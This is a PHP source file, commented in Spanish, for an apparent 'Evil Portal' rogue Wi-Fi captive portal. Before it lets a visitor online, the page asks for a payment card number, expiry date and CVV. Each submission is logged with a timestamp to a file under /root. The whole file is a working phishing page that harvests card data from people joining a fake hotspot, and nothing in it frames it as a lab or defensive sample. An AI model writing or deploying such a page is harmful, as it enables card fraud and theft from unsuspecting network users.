<?php
require_once('helper.php');

// Inicializar Evil Portal
EvilPortal::initialize();

// Manejar la autorización
if (!EvilPortal::checkAuthorization()) {
    // Si no está autorizado, mostrar el formulario de inicio de sesión
    EvilPortal::showLoginForm();
} else {
    // Si está autorizado, redirigir al destino original
    EvilPortal::redirect();
}

// Función para capturar y almacenar los datos de la tarjeta
function captureCardData($cardNumber, $expirationDate, $cvv) {
    $logFile = '/root/evil-portal-logs/card_data.txt'; // Asegúrate de tener los permisos adecuados para escribir en este archivo
    $logEntry = date('Y-m-d H:i:s') . " - Card Number: $cardNumber, Expiration: $expirationDate, CVV: $cvv\n";
    file_put_contents($logFile, $logEntry, FILE_APPEND);
}

// Manejar el envío del formulario
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $cardNumber = $_POST['card_number'] ?? 'No proporcionado';
    $expirationDate = $_POST['expiration_date'] ?? 'No proporcionado';
    $cvv = $_POST['cvv'] ?? 'No proporcionado';
    
    if ($cardNumber !== 'No proporcionado' && $expirationDate !== 'No proporcionado' && $cvv !== 'No proporcionado') {
        captureCardData($cardNumber, $expirationDate, $cvv);
        EvilPortal::authorize();
        EvilPortal::redirect();
    }
}

// Mostrar el formulario de captura de tarjeta
function showCardForm() {
    echo "
    <form method='POST'>
        <input type='text' name='card_number' placeholder='Número de tarjeta' required>
        <input type='text' name='expiration_date' placeholder='MM/YY' required>
        <input type='text' name='cvv' placeholder='CVV' required>
        <input type='submit' value='Enviar'>
    </form>";
}

// Mostrar el formulario si no se ha enviado el formulario o los datos son inválidos
if ($_SERVER['REQUEST_METHOD'] !== 'POST' || ($_SERVER['REQUEST_METHOD'] === 'POST' && (empty($_POST['card_number']) || empty($_POST['expiration_date']) || empty($_POST['cvv'])))) {
    showCardForm();
}
?>
